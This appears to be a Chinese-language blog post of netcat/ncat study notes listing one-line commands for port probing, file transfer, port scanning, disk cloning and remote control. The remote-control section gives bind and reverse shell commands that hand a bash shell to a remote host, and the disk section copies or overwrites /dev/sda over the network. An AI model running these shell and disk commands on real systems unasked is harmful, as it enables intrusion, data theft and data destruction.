---
layout: post
title: NC（ncat）学习笔记
categories: Security
description: NC（ncat）学习笔记
keywords: nc, ncat
---

## 接口探测

```
nc -nv 1.1.1.1 80		##接口探测，发起链接
```
## 文本交互

```
A:nc -l -p 4444
B:nc -vn 1.1.1.1 4444

nc -nv 1.1.1.1 4444 -q 1 		##输出结束1秒后结束链接
```
## 传输文件

```
接收端：nc -lp 4444 > 1.doc
发送端：nc -nv 1.1.1.1 4444 < 1.doc -q 1
or
接收端：nc -nv 1.1.1.1 4444 > 1.doc
发送端：nc -lp 4444 < 1.doc -q 1
```
## 传输目录

```
发送端:tar -cvf - music/ | nc -lp 4444 -q 1
接收端:nc -nv 1.1.1.1 4444 | tar -xvf -
```
## 端口扫描

```
nc -nvz 1.1.1.1 1-65535			##tcp端口扫描
nc -nvzu 1.1.1.1 1-1024			##UPD端口扫描
```

## 远程硬盘克隆

```
A:nc -lp 4444 | dd of=/dev/sda
B:dd if=/dev/sda | nc -nv 1.1.1.1 4444 -q 1
```
## 远程控制

```
正向：
A:nc -lp 4444 -c bash
B:nc 1.1.1.1 4444

反向：
A:nc -lp 4444
B:nc 1.1.1.1 4444 -c bash
```
## ncat限制访问与加密传输

```
ncat -c bash --allow 2.2.2.2 -nvl 4444 --ssl
ncat -nv 1.1.1.1 4444 --ssl
```